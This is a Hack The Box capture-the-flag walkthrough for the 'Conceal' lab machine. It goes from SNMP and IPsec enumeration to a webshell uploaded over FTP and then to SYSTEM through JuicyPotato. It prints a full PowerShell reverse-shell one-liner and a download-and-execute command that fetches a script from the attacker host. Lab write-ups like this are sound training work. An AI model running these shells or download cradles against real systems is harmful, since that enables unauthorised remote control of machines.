# Box 



![](img/Pasted%20image%2020210821115044.png)

https://app.hackthebox.eu/machines/Conceal

# Profile

 <img src="http://www.hackthebox.eu/badge/image/296177" alt="Hack The Box"> 

https://www.hackthebox.eu/home/users/profile/296177

# Table of contents

* [Reconnaissance](#reconnaissance)
* [Exploitation](#exploitation)
* [Post-Exploitation](#post-exploitation)
  + [User](#user)
  + [Root](#root)

# Contents 

## Reconnaissance

Let's start with nmap :

```bash
nmap -sV -sC -Pn --top-ports 1000 -oN scan_10.10.10.116 10.10.10.116
```

![](img/Pasted%20image%2020210821120208.png)

Well  we got nothing... Let's try udp then.

```sh
sudo nmap -sU -sV  -Pn  --top-ports 1000  -oN fullscan_udp_10.10.10.116 10.10.10.116
```

Well it was way too long so I stopped the process but port 500 & 161 showed up so I did a scan with only these 2 ports. It reveals SNMPv1 and  something called "isakm" which is going to be our port for a VPN.

For the SNMP service, we will use `snmpwalk` : 

```
snmpwalk -v1  -c public 10.10.10.116
```

One line will be interesting and useful for after : 

```
iso.3.6.1.2.1.1.4.0 = STRING: "IKE VPN password PSK - 9C8B1A372B1878851BE2C097031B6E43"
```

Here you can read about IPsec/IKE VPN. We will need this to connect to the VPN.
https://book.hacktricks.xyz/pentesting/ipsec-ike-vpn-pentesting

Let's crack it using `hashcat`

```
hashcat.exe -a 0 -m 1000 ../hashes.txt rockyou.txt -o out.txt
```

```
9c8b1a372b1878851be2c097031b6e43:Dudecake1!
```

From here I spent a lot of time trying to find group, user & creds to get an Ipsec tunnel. But I found a way here  (https://libreswan.org/wiki/VPN_server_for_remote_clients_using_IKEv1_XAUTH_with_PSK) which does not necesseraly ask for these informations.

Using `ike-scan` we get valuable informations that will help us create our config files to setup our IpSec tunnel .

![](img/Pasted%20image%2020210821134005.png)

You will find information about how to create your file conf here : 
https://wiki.strongswan.org/projects/strongswan/wiki/connsection

Let's create our `ipsec.secrets` and `ipsec.conf` 

![](img/Pasted%20image%2020210821134241.png)

```
# ipsec.conf - strongSwan IPsec configuration file

# basic configuration

config setup
         strictcrlpolicy=no
         uniqueids = no
         charondebug="all"
conn conceal 
    authby=secret
    auto=add
    ike=3des-sha1-modp1024!
    esp=3des-sha1!
    type=transport
    keyexchange=ikev1
    left=10.10.14.13
    right=10.10.10.116
    rightsubnet=10.10.10.116[tcp]
```

* `charondebug` is set to have a maximum verbose
* `uniqueids` is here to get a proper new id for each connection
* `strictcrlpolicy` check for Certificate revocation list
* `authby` is the mode for loggin, here PSK
* `auto` what operation should be done automatically. here add  loads a connection without starting it. 
* `ike`,`esp` are both element found in the `ike-scan` above.
* `type` is the mode used for the connection. This is a box so a host-to-host connection, so transport mode.
* `keyexchange`, self explanatory, version of ikev1 shown in `ike-scan`
* `left/right` are just our ip local & remote one.
* `rightsubnet`  is the traffic that will come to us. The \[tcp\] at the end is mandatory or it will not work. 

![](img/Pasted%20image%2020210821150149.png)

Ok now we can use nmap again.

![](img/Pasted%20image%2020210821150415.png)


FTP anonymous login is authorized, so let's see.

![](img/Pasted%20image%2020210821150518.png)

Nothing inside, however we can upload files :

![](img/Pasted%20image%2020210821150544.png)

Let's see the website now.

![](img/Pasted%20image%2020210821150617.png)

Nothing special, a basic IIS. 

Let's run ffuf.
```
ffuf -u http://10.10.10.116/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.116/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

upload                  [Status: 301, Size: 150, Words: 9, Lines: 2]
:: Progress: [4686/4686] :: Job [1/1] :: 124 req/sec :: Duration: [0:00:22] :: Errors: 0 ::
```


Let's see what's inside this directory. 

![](img/Pasted%20image%2020210821150929.png)

Hmm, this is the file I uploaded on the ftp server. So we can probably upload a webpage with a RCE.

I'll use this one https://github.com/tennc/webshell/blob/master/asp/webshell.asp.

Once uploaded, you should get a RCE.

![](img/Pasted%20image%2020210821151503.png)

Let's get a reverse shell :

```powershell 
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.13',1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

Encode it in base64 so we don't worry about strings. (https://byt3bl33d3r.github.io/converting-commands-to-powershell-compatible-encoded-strings-for-dummies.html)

now prepend `powershell -enc`, setup a listener and you should get a shell.

![](img/Pasted%20image%2020210821152036.png)

## Post-Exploitation

### User

We already are user.

![](img/Pasted%20image%2020210821152122.png)

### Root

Running `whoami /priv`  :

```
PS C:\Users> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeShutdownPrivilege           Shut down the system                      Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled
```

Let's setup JuicyPotato.

Using systeminfo to get the right CLSID we are on windows 10. 
```
Host Name:                 CONCEAL  
OS Name:                   Microsoft Windows 10 Enterprise                                                            
OS Version:                10.0.15063 N/A Build 15063                                                                 
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation          
OS Build Type:             Multiprocessor Free             
Registered Owner:          Windows User            
```


We will use the CLSID {e60687f7-01a1-40aa-86ac-db1cbf673334}

Let's setup a smb server to copy our file.

```         
┌──(kali㉿kali)-[~/Hacking/tmp/smb]
└─$ smbserver.py share . -smb2support
Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

On the remote machine : 
```
net use x: \\10.10.14.13\share 
cd x:\
```

With JuicyPotato I always use the same payload to execute my payload. Put our previous payload in a file, and execute it by downloading it on the remote machine.

Now, we can use JuicyPotato.

```
.\JuicyPotato.exe -l 1337 -c "{e60687f7-01a1-40aa-86ac-db1cbf673334}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.13:4444/rev.ps1')" -t *
```

![](img/Pasted%20image%2020210821153518.png)

Rooted.